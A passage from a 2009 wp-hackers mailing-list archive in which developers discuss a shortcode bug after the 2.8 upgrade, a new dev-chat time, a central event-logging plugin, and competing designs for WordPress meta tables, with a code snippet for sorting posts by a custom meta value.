> add_shortcode('merg', 'service_merg');
>

From aaron at xavisys.com  Thu Jul 23 23:27:58 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Thu, 23 Jul 2009 16:27:58 -0700
Subject: [wp-hackers] IRC Dev Chat: New Day/Time
In-Reply-To: <D57CC145-BF01-4604-B98E-11685BD376D2@automattic.com>
References: <mailman.608.1248384903.16651.wp-hackers@lists.automattic.com>
	<D57CC145-BF01-4604-B98E-11685BD376D2@automattic.com>
Message-ID: <4A68F1FE.7030507@xavisys.com>

For those trying to convert the time, here's next weeks meeting in all 
timezones:
http://www.timeanddate.com/worldclock/fixedtime.html?month=7&day=30&year=2009&hour=21&min=0&sec=0&p1=0

Jane Wells wrote:
> Hi everyone. Just wanted to let you know that the day/time of the IR 
> #wordpress-dev dev chat is moving as of next week to Thursdays at 9PM 
> UTC. This change comes as an accommodation to European schedules. If 
> you haven't attended a dev chat lately, stop by sometime. We've gotten 
> fairly organized, and post about agenda topics during the week leading 
> up to each chat at http://wpdevel.wordpress.com. The last few chats 
> have been very productive, and we've generally got at least 2 of the 
> core devs in attendance, if not more. Some big issues are coming up 
> over the next few weeks and as we get into the 2.9 dev cycle, so the 
> chats are sure to be lively.
>
> If you do attend, please remember to be nice to people, and feel free 
> to suggest an agenda item at http://wpdevel.wordpress.com. We post the 
> agenda at the beginning of the chat, and go through items in order, 
> with some time at the end for general discussion of anything that 
> didn't make the agenda that week.
>
> So mark your calendars for Thursdays at 9pm UTC!
> Jane


From gaarai at gaarai.com  Fri Jul 24 03:49:56 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Thu, 23 Jul 2009 22:49:56 -0500
Subject: [wp-hackers] Shortcodes stopped working after 2.8.2
In-Reply-To: <58410e2e0907231614j2403322eu8fc7202505a4a96c@mail.gmail.com>
References: <58410e2e0907231547h73275629k6eae053367a94a13@mail.gmail.com>
	<58410e2e0907231614j2403322eu8fc7202505a4a96c@mail.gmail.com>
Message-ID: <4A692F64.7000703@gaarai.com>

I pasted your exact code into the default theme's functions.php file, 
created a new post with the shortcodes, and it worked like a charm.

The content of the post is:

    [hc] [merg]

Have you tried testing the code out on a different theme and/or 
disabling all plugins. It seems to me that while upgrading to 2.8+ may 
have caused you to experience the problem, the true source lies with 
code outside the core.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/



Bryan Harley wrote:
> Actually, I should say 2.8 broke it.  I reverted back to 2.7.1 and the
> shortcodes are working again.
>
>
> On Thu, Jul 23, 2009 at 3:47 PM, Bryan Harley<bryanharley at gmail.com> wrote:
>   
>> Some of my short codes aren't working in 2.8.2.  It's weird, some work
>> but some don't.  Anyone know what the problem might be?
>>
>> All I'm doing is stuff like this...
>>
>>
>> function service_hc() {
>> return '<li><a href="URL">Health Care</a></li>';
>> }
>>
>> function service_merg() {
>> return '<li><a href="URL">Mergers &#038; Acquisitions</a></li>';
>> }
>>
>> add_shortcode('hc', 'service_hc');
>> add_shortcode('merg', 'service_merg');
>>
>>     
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From scribu at gmail.com  Fri Jul 24 10:21:31 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 13:21:31 +0300
Subject: [wp-hackers] Meta tables: Take 5
Message-ID: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>

Yes, this subject has been discussed a lot recently, both on trac, as well
as on the dev chat. But I think the solution I'm about to propose has been
overlooked. It is based on two principles:

- WP core shouldn't create tables that it doesn't use. The same principle is
applied to bundled javascript and php classes.

- Having a combined meta table for all, or most, object types makes for bad
performance, especially when we consider MU instalations.

So, I propose that Core have an API for creating standard meta tables for
whatever plugins need.

Of course, this would be accompanied by unified functions for handling meta
data in said tables.

Example: A plugin needs a comment meta table. First, it makes sure it's
available:

register_activation_hook(__FILE__, 'example_plugin_activation');

function example_plugin_activation() {
    enable_meta_table('comment');
}


Then, it uses it to store data, etc.:

...
add_meta('comment', $comment_id, $meta_key, $meta_value);
...


I am willing to code this API, if people think it's a sound ideea.


By the way, I also wrote a blog post about this:
http://scribu.net/wordpress/meta-tables-for-wordpress.html


-- 
http://scribu.net

From simon at sweetinteraction.com  Fri Jul 24 10:37:54 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Fri, 24 Jul 2009 11:37:54 +0100
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
Message-ID: <77c8b7bf0907240337yf995bddja4bb415ce0b9518e@mail.gmail.com>

On Fri, Jul 24, 2009 at 11:21 AM, scribu<scribu at gmail.com> wrote:
>
> By the way, I also wrote a blog post about this:
> http://scribu.net/wordpress/meta-tables-for-wordpress.html
>

By the power of synchronicity, and great minds thinking alike, Westi
seems to be considering similar ideas:
http://blog.ftwr.co.uk/archives/2009/07/23/a-better-meta-api-for-wordpress/

S


---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From email at dalegroup.net  Fri Jul 24 10:48:14 2009
From: email at dalegroup.net (Michael Dale)
Date: Fri, 24 Jul 2009 20:48:14 +1000
Subject: [wp-hackers] Bluetrait Connector WordPress Plugin
Message-ID: <20090724104814.eac03054@mail.lttd.net>

Hi All,

I wrote a plugin a while back called Bluetrait Event Viewer that tracks events within your WordPress install (such as failed logins etc).

I have just released a new plugin called Bluetrait Connector, that allows these events to be synced back to a central server. Think of it like syslog for a WordPress install.

If you're interested please do test and let me know what you think.

More information can be found here:
http://www.bluetrait.com/page/bluetrait-connector-for-wordpress/

Thanks again,
Michael.

From scribu at gmail.com  Fri Jul 24 11:17:49 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 14:17:49 +0300
Subject: [wp-hackers] Bluetrait Connector WordPress Plugin
In-Reply-To: <20090724104814.eac03054@mail.lttd.net>
References: <20090724104814.eac03054@mail.lttd.net>
Message-ID: <349fe48b0907240417y359ae95cn2676438c00be635f@mail.gmail.com>

After looking around your site, I wasn't able to figure out what Bluetrait
actually does and why would I use the plugin.


On Fri, Jul 24, 2009 at 1:48 PM, Michael Dale <email at dalegroup.net> wrote:

> Hi All,
>
> I wrote a plugin a while back called Bluetrait Event Viewer that tracks
> events within your WordPress install (such as failed logins etc).
>
> I have just released a new plugin called Bluetrait Connector, that allows
> these events to be synced back to a central server. Think of it like syslog
> for a WordPress install.
>
> If you're interested please do test and let me know what you think.
>
> More information can be found here:
> http://www.bluetrait.com/page/bluetrait-connector-for-wordpress/
>
> Thanks again,
> Michael.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From email at dalegroup.net  Fri Jul 24 11:26:01 2009
From: email at dalegroup.net (Michael Dale)
Date: Fri, 24 Jul 2009 21:26:01 +1000
Subject: [wp-hackers] Bluetrait Connector WordPress Plugin
In-Reply-To: 349fe48b0907240417y359ae95cn2676438c00be635f@mail.gmail.com
Message-ID: <20090724112601.d6e08a87@mail.lttd.net>

Bluetrait is a piece of blog software that I wrote that has built in SOAP functionality.

Bluetrait acts as the server for all events sent from WordPress clients. Meaning you can easily see what version of WordPress all your wordpress sites are running and gives you a way to see the who is logging in to each site from a central place.

Future versions will allow you to remotely upgrade WordPress sites etc.

This is only useful for people managing multiple WordPress sites.

Thanks,
Michael. 

----- Original Message -----
From: scribu [mailto:scribu at gmail.com]
To:
wp-hackers at lists.automattic.com
Sent: Fri, 24 Jul 2009 21:17:49
+1000
Subject: Re: [wp-hackers] Bluetrait Connector WordPress Plugin


> After looking around your site, I wasn't able to figure out what Bluetrait
> actually does and why would I use the plugin.
> 
> 
> On Fri, Jul 24, 2009 at 1:48 PM, Michael Dale <email at dalegroup.net> wrote:
> 
> > Hi All,
> >
> > I wrote a plugin a while back called Bluetrait Event Viewer that tracks
> > events within your WordPress install (such as failed logins etc).
> >
> > I have just released a new plugin called Bluetrait Connector, that allows
> > these events to be synced back to a central server. Think of it like
> syslog
> > for a WordPress install.
> >
> > If you're interested please do test and let me know what you think.
> >
> > More information can be found here:
> > http://www.bluetrait.com/page/bluetrait-connector-for-wordpress/
> >
> > Thanks again,
> > Michael.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> 
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From scribu at gmail.com  Fri Jul 24 11:31:35 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 14:31:35 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <77c8b7bf0907240337yf995bddja4bb415ce0b9518e@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<77c8b7bf0907240337yf995bddja4bb415ce0b9518e@mail.gmail.com>
Message-ID: <349fe48b0907240431o29bffc3eyf8c1ad41c1091a9a@mail.gmail.com>

Thanks for the link. My post felt kind of lonely. :-)


On Fri, Jul 24, 2009 at 1:37 PM, Simon Wheatley
<simon at sweetinteraction.com>wrote:

> On Fri, Jul 24, 2009 at 11:21 AM, scribu<scribu at gmail.com> wrote:
> >
> > By the way, I also wrote a blog post about this:
> > http://scribu.net/wordpress/meta-tables-for-wordpress.html
> >
>
> By the power of synchronicity, and great minds thinking alike, Westi
> seems to be considering similar ideas:
> http://blog.ftwr.co.uk/archives/2009/07/23/a-better-meta-api-for-wordpress/
>
> S
>
>
> ---
> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> Registered office: 7 Malton Av, Manchester, M21 8AT
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From scribu at gmail.com  Fri Jul 24 11:34:05 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 14:34:05 +0300
Subject: [wp-hackers] Bluetrait Connector WordPress Plugin
In-Reply-To: <20090724112601.d6e08a87@mail.lttd.net>
References: <20090724112601.d6e08a87@mail.lttd.net>
Message-ID: <349fe48b0907240434n7fbba072u7772d55178de49e7@mail.gmail.com>

Ok, thanks for the info. Would be helpful if people could also find it on
your site, easily.


On Fri, Jul 24, 2009 at 2:26 PM, Michael Dale <email at dalegroup.net> wrote:

> Bluetrait is a piece of blog software that I wrote that has built in SOAP
> functionality.
>
> Bluetrait acts as the server for all events sent from WordPress clients.
> Meaning you can easily see what version of WordPress all your wordpress
> sites are running and gives you a way to see the who is logging in to each
> site from a central place.
>
> Future versions will allow you to remotely upgrade WordPress sites etc.
>
> This is only useful for people managing multiple WordPress sites.
>
> Thanks,
> Michael.
>
> ----- Original Message -----
> From: scribu [mailto:scribu at gmail.com]
> To:
> wp-hackers at lists.automattic.com
> Sent: Fri, 24 Jul 2009 21:17:49
> +1000
> Subject: Re: [wp-hackers] Bluetrait Connector WordPress Plugin
>
>
> > After looking around your site, I wasn't able to figure out what
> Bluetrait
> > actually does and why would I use the plugin.
> >
> >
> > On Fri, Jul 24, 2009 at 1:48 PM, Michael Dale <email at dalegroup.net>
> wrote:
> >
> > > Hi All,
> > >
> > > I wrote a plugin a while back called Bluetrait Event Viewer that tracks
> > > events within your WordPress install (such as failed logins etc).
> > >
> > > I have just released a new plugin called Bluetrait Connector, that
> allows
> > > these events to be synced back to a central server. Think of it like
> > syslog
> > > for a WordPress install.
> > >
> > > If you're interested please do test and let me know what you think.
> > >
> > > More information can be found here:
> > > http://www.bluetrait.com/page/bluetrait-connector-for-wordpress/
> > >
> > > Thanks again,
> > > Michael.
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> >
> > --
> > http://scribu.net
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From wordpress at santosj.name  Fri Jul 24 13:34:01 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 24 Jul 2009 08:34:01 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
Message-ID: <20090724083401.e9a29057.wordpress@santosj.name>

Am I to assume this is a multiple table approach? For example, comment meta table, post meta table, user meta table, etc.

Jacob Santos


On Fri, 24 Jul 2009 13:21:31 +0300
scribu <scribu at gmail.com> wrote:

> Yes, this subject has been discussed a lot recently, both on trac, as well
> as on the dev chat. But I think the solution I'm about to propose has been
> overlooked. It is based on two principles:
> 
> - WP core shouldn't create tables that it doesn't use. The same principle is
> applied to bundled javascript and php classes.
> 
> - Having a combined meta table for all, or most, object types makes for bad
> performance, especially when we consider MU instalations.
> 
> So, I propose that Core have an API for creating standard meta tables for
> whatever plugins need.
> 
> Of course, this would be accompanied by unified functions for handling meta
> data in said tables.
> 
> Example: A plugin needs a comment meta table. First, it makes sure it's
> available:
> 
> register_activation_hook(__FILE__, 'example_plugin_activation');
> 
> function example_plugin_activation() {
>     enable_meta_table('comment');
> }
> 
> 
> Then, it uses it to store data, etc.:
> 
> ...
> add_meta('comment', $comment_id, $meta_key, $meta_value);
> ...
> 
> 
> I am willing to code this API, if people think it's a sound ideea.
> 
> 
> By the way, I also wrote a blog post about this:
> http://scribu.net/wordpress/meta-tables-for-wordpress.html
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From scribu at gmail.com  Fri Jul 24 14:52:21 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 17:52:21 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <20090724083401.e9a29057.wordpress@santosj.name>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<20090724083401.e9a29057.wordpress@santosj.name>
Message-ID: <349fe48b0907240752r31001486rfca3e0512ea3fb24@mail.gmail.com>

Yes, it is, but each table would be created only when requested by a plugin.

On Fri, Jul 24, 2009 at 4:34 PM, Jacob Santos <wordpress at santosj.name>wrote:

> Am I to assume this is a multiple table approach? For example, comment meta
> table, post meta table, user meta table, etc.
>
> Jacob Santos
>

-- 
http://scribu.net

From jer at simianuprising.com  Fri Jul 24 14:57:35 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 24 Jul 2009 10:57:35 -0400
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907240752r31001486rfca3e0512ea3fb24@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<20090724083401.e9a29057.wordpress@santosj.name>
	<349fe48b0907240752r31001486rfca3e0512ea3fb24@mail.gmail.com>
Message-ID: <e1202cb10907240757o6dc27b89u8a53c1a828fd95d1@mail.gmail.com>

mmmmmmm, enable_meta_table('category');

+1


-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From mikeschinkel at newclarity.net  Fri Jul 24 15:22:29 2009
From: mikeschinkel at newclarity.net (mikeschinkel at newclarity.net)
Date: Fri, 24 Jul 2009 10:22:29 -0500 (CDT)
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
Message-ID: <3E0C513E-3FA1-4338-94DC-AE4787AF9514@newclarity.net>

That's feeling very Drupalish, but in a good way.

+1

Sent from my iPhone

On Jul 24, 2009, at 6:25 AM, scribu <scribu at gmail.com> wrote:

> Yes, this subject has been discussed a lot recently, both on trac,  
> as well
> as on the dev chat. But I think the solution I'm about to propose  
> has been
> overlooked. It is based on two principles:
>
> - WP core shouldn't create tables that it doesn't use. The same  
> principle is
> applied to bundled javascript and php classes.
>
> - Having a combined meta table for all, or most, object types makes  
> for bad
> performance, especially when we consider MU instalations.
>
> So, I propose that Core have an API for creating standard meta  
> tables for
> whatever plugins need.
>
> Of course, this would be accompanied by unified functions for  
> handling meta
> data in said tables.
>
> Example: A plugin needs a comment meta table. First, it makes sure  
> it's
> available:
>
> register_activation_hook(__FILE__, 'example_plugin_activation');
>
> function example_plugin_activation() {
>    enable_meta_table('comment');
> }
>
>
> Then, it uses it to store data, etc.:
>
> ...
> add_meta('comment', $comment_id, $meta_key, $meta_value);
> ...
>
>
> I am willing to code this API, if people think it's a sound ideea.
>
>
> By the way, I also wrote a blog post about this:
> http://scribu.net/wordpress/meta-tables-for-wordpress.html
>
>
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wordpress at santosj.name  Fri Jul 24 15:38:30 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 24 Jul 2009 10:38:30 -0500
Subject: [wp-hackers] Rebuttal  (re: Meta tables: Take 5)
Message-ID: <4A69D576.1010005@santosj.name>

Scribu,

I understand your argument that having a single table for meta is an 
entirely bad idea based on the following assumptions.

1. Having hundreds of millions of rows is a performance problem for 
searching, insertion, etc.
2. Having multiple blogs using the same table is a bad idea because the 
size of the single table increases exponentially.
3. It quite frankly just plain sucks and is "bad design."

Let me refute these claims, and if you have any further ones, then let 
me know as I don't want to put up a straw man. These are just the ones 
that I've heard in the past as to why single table solutions are 
terrible. You might have others.

1. With proper indexes, performance problems shouldn't be an issue. 
Having millions of rows in majority of cases shouldn't hinder most of 
the use cases with the correct indexes to search on.
2. I would probably state that having multiple meta tables for each blog 
would be a good idea as it doesn't have to be tied to just all of the 
blogs for a single table but for a single blog for MU installations.
3. It is in my opinion that having multiple tables with the same 
structure and tiny amount of rows is even worse design than a single 
table. Alas, a compromise can probably be found between a single table 
and multiple tables.

I will contend that for the majority of non-MU and plain WordPress 
installations, having a single meta meta table will never even get close 
to reaching 100,000 rows, let alone the millions that would be required 
to degrade performance.

I was actually going to flame you based on my (now correct) assumption 
that it would be creating new tables. I think that it would be against 
my doing so, or at least not publicly (the flame email should be 
arriving to your email soon).

Jacob Santos

From gwkgarchive at gmail.com  Fri Jul 24 15:40:21 2009
From: gwkgarchive at gmail.com (Gwkg Archive)
Date: Fri, 24 Jul 2009 11:40:21 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 54, Issue 27
In-Reply-To: <mailman.608.1248384903.16651.wp-hackers@lists.automattic.com>
References: <mailman.608.1248384903.16651.wp-hackers@lists.automattic.com>
Message-ID: <270547670907240840w51b515edwf62d828f8418e366@mail.gmail.com>

Thanks scribd...

I couldn't find a(n easy) way to hook IFNULL into the query and that JOIN
statement I posted wasn't what was returning the duplicated results, it was
passing the query vars through an array that did it.  Problem is that I
tried so many different things yesterday I couldn't even duplicate it.

On the brightside, here is a solution

 function join_meta_value($q) {
  global $wpdb;
  $q .=  "LEFT JOIN (
                     SELECT *
                     FROM $wpdb->postmeta
                     WHERE meta_key =  'verification_value' ) AS metasort
            ON $wpdb->posts.ID = metasort.post_id";
  return ($q);
  }

function sort_by_value() {
  $orderby = "metasort.meta_value DESC";
  return $orderby;
  }

 add_filter('posts_join','join_meta_value');
 add_filter('posts_orderby','sort_by_value');

Thanks again for you responses.  Even though I didn't use them, I definitely
learned something from them.


> Message: 7
> Date: Thu, 23 Jul 2009 17:05:46 -0400
> From: Gwkg Archive <gwkgarchive at gmail.com>
> Subject: [wp-hackers] Sorting Posts By Custom Meta Value
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <270547670907231405m33cd9d02h67147674bd5af00f at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Ok I'm doing pretty good digging through the Wordpress Code and adding some
> functionality to a theme.  Heres what I did so far
>
> 1. Made one of my categories a Directory with its own template
> (category-9.php)
>
> 2. Added a drop-down box for posts in the Admin that lets the admin set a
> meta_key verification_level with a value of 0, 1, 2 or 3
>
> I want to sort on that value and I'm having a hard time figuring it out.
>
> A couple things <em>almost</em> worked like adding a post_join filter
>
> " JOIN wp_postmeta ON wp_posts.ID = wp_postmeta.post_id";
>
> but that was returning duplicated posts
>
> The closest (and easiest) mod was adding this line in category-9.php
>
> $posts = query_posts(
> "meta_key=verification_value&orderby=meta_value&order=desc" );
>
> but the problem is a lot of posts don't have the verification_value set and
> aren't being shown from that
>
> What's the best way to grab the posts without a value set in that meta_key
> and add them to the end of the post array without actually setting that
> value in the database?
>
>
> ------------------------------
>
> Message: 8
> Date: Fri, 24 Jul 2009 00:30:20 +0300
> From: scribu <scribu at gmail.com>
> Subject: Re: [wp-hackers] Sorting Posts By Custom Meta Value
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <349fe48b0907231430l2d90b708jf2fa6a7194bc7166 at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> >
> > " JOIN wp_postmeta ON wp_posts.ID = wp_postmeta.post_id";
> >
> > but that was returning duplicated posts
>
>
> You can add a GROUP BY wp_posts.ID to remove the duplicates.
>
>
> --
> http://scribu.net
>
>
> ------------------------------
>
> Message: 9
> Date: Fri, 24 Jul 2009 00:35:00 +0300
> From: scribu <scribu at gmail.com>
> Subject: Re: [wp-hackers] Sorting Posts By Custom Meta Value
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <349fe48b0907231435v356f7729vcf62808c3db93395 at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> >
> > What's the best way to grab the posts without a value set in that
> meta_key
> > and add them to the end of the post array without actually setting that
> > value in the database?
> >
>
> You could make the select look like this:
>
> SELECT ..., IFNULL(meta_value, 0) ...
>
> This will replace null values with 0.
>
>
> --
> http://scribu.net
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 54, Issue 27
> ******************************************
>

From peter.westwood at ftwr.co.uk  Fri Jul 24 15:46:24 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 24 Jul 2009 16:46:24 +0100
Subject: [wp-hackers] Rebuttal  (re: Meta tables: Take 5)
In-Reply-To: <4A69D576.1010005@santosj.name>
References: <4A69D576.1010005@santosj.name>
Message-ID: <C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>


On 24 Jul 2009, at 16:38, Jacob Santos wrote:

> 1. With proper indexes, performance problems shouldn't be an issue.  
> Having millions of rows in majority of cases shouldn't hinder most  
> of the use cases with the correct indexes to search on.
> 2. I would probably state that having multiple meta tables for each  
> blog would be a good idea as it doesn't have to be tied to just all  
> of the blogs for a single table but for a single blog for MU  
> installations.
> 3. It is in my opinion that having multiple tables with the same  
> structure and tiny amount of rows is even worse design than a single  
> table. Alas, a compromise can probably be found between a single  
> table and multiple tables.
>
> I will contend that for the majority of non-MU and plain WordPress  
> installations, having a single meta meta table will never even get  
> close to reaching 100,000 rows, let alone the millions that would be  
> required to degrade performance.


Agreed

I was very careful in my proposal [1] to talk about an api which was  
db structure agnostic, because they may be arguments both ways and I  
think the storage mechanism should be completely separate from the api  
and it is really the api we need to decide on first!

Once we have actually got some data about what is being stored and  
what is being queried there may be cases when a object type specific  
meta table is required but I would expect that for 80% of use cases a  
single table would be fine.

For what its worth bbPress is built around a single meta table [2]  
(which even the options go in)

westi

[1] http://blog.ftwr.co.uk/archives/2009/07/23/a-better-meta-api-for-wordpress/
[2] http://trac.bbpress.org/browser/trunk/bb-admin/includes/defaults.bb-schema.php#L28
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mikeschinkel at newclarity.net  Fri Jul 24 15:50:07 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 24 Jul 2009 11:50:07 -0400
Subject: [wp-hackers] Rebuttal  (re: Meta tables: Take 5)
In-Reply-To: <4A69D576.1010005@santosj.name>
References: <4A69D576.1010005@santosj.name>
Message-ID: <9C801D46-D2EC-4CD0-8406-1813AEECE6BF@newclarity.net>

I also agree with Jacob that the performance concern is way overrated.

OTOH, I'm very weary of debating things on this list only to never see  
a consensus nor any results so I'd just really be happy to see  
*something* done related to meta, because I need it.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/




On Jul 24, 2009, at 11:38 AM, Jacob Santos wrote:

> Scribu,
>
> I understand your argument that having a single table for meta is an  
> entirely bad idea based on the following assumptions.
>
> 1. Having hundreds of millions of rows is a performance problem for  
> searching, insertion, etc.
> 2. Having multiple blogs using the same table is a bad idea because  
> the size of the single table increases exponentially.
> 3. It quite frankly just plain sucks and is "bad design."
>
> Let me refute these claims, and if you have any further ones, then  
> let me know as I don't want to put up a straw man. These are just  
> the ones that I've heard in the past as to why single table  
> solutions are terrible. You might have others.
>
> 1. With proper indexes, performance problems shouldn't be an issue.  
> Having millions of rows in majority of cases shouldn't hinder most  
> of the use cases with the correct indexes to search on.
> 2. I would probably state that having multiple meta tables for each  
> blog would be a good idea as it doesn't have to be tied to just all  
> of the blogs for a single table but for a single blog for MU  
> installations.
> 3. It is in my opinion that having multiple tables with the same  
> structure and tiny amount of rows is even worse design than a single  
> table. Alas, a compromise can probably be found between a single  
> table and multiple tables.
>
> I will contend that for the majority of non-MU and plain WordPress  
> installations, having a single meta meta table will never even get  
> close to reaching 100,000 rows, let alone the millions that would be  
> required to degrade performance.
>
> I was actually going to flame you based on my (now correct)  
> assumption that it would be creating new tables. I think that it  
> would be against my doing so, or at least not publicly (the flame  
> email should be arriving to your email soon).
>
> Jacob Santos
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From supporto at pixline.net  Fri Jul 24 16:33:26 2009
From: supporto at pixline.net (=?WINDOWS-1252?Q?Pixline_=9B_Paolo_Tresso?=)
Date: Fri, 24 Jul 2009 18:33:26 +0200
Subject: [wp-hackers] Rebuttal  (re: Meta tables: Take 5)
In-Reply-To: <4A69D576.1010005@santosj.name>
References: <4A69D576.1010005@santosj.name>
Message-ID: <AC92EAF8-B9B2-4643-8ACA-14CEFA0FDE28@pixline.net>

Jacob Santos wrote:

> 3. It is in my opinion that having multiple tables with the same  
> structure and tiny amount of rows is even worse design than a single  
> table. Alas, a compromise can probably be found between a single  
> table and multiple tables.

+1

also, this should be considered for WPMU as well, at least from  
plugins authors.
I'm working on a 100+ blog installation without the ability to spread  
multiple mysql server, and I'm really struggling about plugins that  
adds more tables than a single blog, for each blog  they're used. ok,  
the whole db is really light compared to our main website, but the  
table namber is growing out of control.

the main website is something that deal with 300K+ users, and its  
monolithic tables - with proper index tuning and some server magic -  
works like a charm. mysql is a bad beast if you don't know how to put  
hands, but when you learn it's a completely different game. also helps:

- good replication scheme design
- memcache ( + memcachdb, if you're brave enough :-)
- mysql proxy


comments in WPMU are also something I would like to have in a single  
global table, but that's another question :-)

paolo/pixline


From wp-hackers at striderweb.com  Fri Jul 24 16:53:58 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Fri, 24 Jul 2009 11:53:58 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <3E0C513E-3FA1-4338-94DC-AE4787AF9514@newclarity.net>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<3E0C513E-3FA1-4338-94DC-AE4787AF9514@newclarity.net>
Message-ID: <0DA20520-821F-46DA-9D66-5FF7974C016C@striderweb.com>

So... You're suggesting making a whole new table every time a plugin  
wants to add some bit of meta, rather than simply adding a column to  
the meta table?

No offense, but if I had a giant lever I could pull to open a trap  
door and drop you into the Sarlaac Pit, I would be reaching for it  
about now....

Stephen

P.S. -- Sorry if that seems overly harsh.  My uncle was eaten by a  
sarlaac, so I probably shouldn't joke.

On Jul 24, 2009, at 6:25 AM, scribu <scribu at gmail.com> wrote:

> I propose that Core have an API for creating standard meta tables for
> whatever plugins need.
>
> Of course, this would be accompanied by unified functions for  
> handling meta
> data in said tables.
>
> Example: A plugin needs a comment meta table. First, it makes sure  
> it's
> available:
>
> register_activation_hook(__FILE__, 'example_plugin_activation');
>
> function example_plugin_activation() {
>   enable_meta_table('comment');
> }
>
>
> Then, it uses it to store data, etc.:
>
> ...
> add_meta('comment', $comment_id, $meta_key, $meta_value);
> ...
>
>
> I am willing to code this API, if people think it's a sound ideea.
>
>
> By the way, I also wrote a blog post about this:
> http://scribu.net/wordpress/meta-tables-for-wordpress.html


From charles at cefm.ca  Fri Jul 24 16:56:40 2009
From: charles at cefm.ca (charles at cefm.ca)
Date: Fri, 24 Jul 2009 09:56:40 -0700 (PDT)
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <0DA20520-821F-46DA-9D66-5FF7974C016C@striderweb.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<3E0C513E-3FA1-4338-94DC-AE4787AF9514@newclarity.net>
	<0DA20520-821F-46DA-9D66-5FF7974C016C@striderweb.com>
Message-ID: <58074.206.47.249.252.1248454600.squirrel@www.cefm.ca>

What if there was an api to create a new meta table by pluggin, but also
